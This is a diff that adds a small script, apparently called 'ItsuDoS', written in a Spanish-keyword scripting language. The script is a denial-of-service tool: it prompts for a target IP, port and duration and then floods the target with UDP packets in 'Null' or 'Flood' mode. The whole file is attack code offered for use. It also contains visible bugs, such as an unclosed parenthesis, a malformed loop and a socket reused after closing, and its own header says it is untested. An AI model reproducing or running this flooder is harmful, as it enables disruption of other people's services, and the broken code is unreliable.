@@ -1,0 +1,68 @@
+# @By Itsu - Si hay Errores es xq la version no fue testeada.
+importar "modules/socket" como net
+importar "modules/time" como t
+importar "modules/sistem" como os
+
+funcion menu(){
+print("~ ItsuDoS")
+print("- L4")
+print(" [ 1 ] UDP - Null]")
+print(" [ 2 ] UDP - Flood")
+}
+
+var select:int = int(input("ItsuDoS >> ")
+
+funcion clear(){
+os.system("clear")
+}
+
+funcion udpnull(IP, Port, time) {
+var s = net.socket(net.AF_INET, net.SOCK_DGRAM)
+var p = ""
+a = t.time()
+while t.time() - a < time:
+try:
+for i in range(45):
+net.sendto(s, p, IP, Port)
+net.sendto(s, p, IP, Port)
+net.close(s)
+t.sleep_ms(25)
+except:
+net.close(s)
+print("[ ! ] Error.")
+}
+
+funcion udpflood(IP, Port, time) {
+var s = net.socket(net.AF_INET, net.SOCK_DGRAM)
+var p = "/x62/x32/x137/x91/x63/x21/x86/x99/x62/x32/x137/x91/x63/x21/x86/x99/x62/x32/x137/x91/x63/x21/x86/x99/x62/x32/x137/x91/x63/x21/x86/x99/x62/x32/x137/x91/x63/x21/x86/x99/x62/x32/x137/x91/x63/x21/x86/x99/x99/x62/x32/x13/x63/x21/x86/x63/x21/x86/"
+a = t.time()
+print(f"send Attack to Tarjet: {IP:Port}")
+while t.time() - a < time:
+try:
+for i range(25):
+net.sendto(s, p, IP, Port)
+net.close(s)
+t.sleep_ms(25)
+except:
+net.close(s)
+print("[ ! ] Error.")
+}
+
+si (select == 1) {
+clear()
+var IP = input("Ingrese IP: ")
+var Port = int(input("Ingrese Puerto:"))
+var time:int = int(input("Time Attack: "))
+udpnull(IP, Port, time)
+} sino si (select == 2) {
+clear()
+var IP = input("Ingrese IP: ")
+var Port = int(input("Ingrese Puerto:"))
+var time:int = int(input("Time Attack: "))
+udpflood(IP, Port, time)
+} sino {
+clear()
+menu()
+print("Syntax Error")
+var select:int = int(input("ItsuDoS >> ")
+}
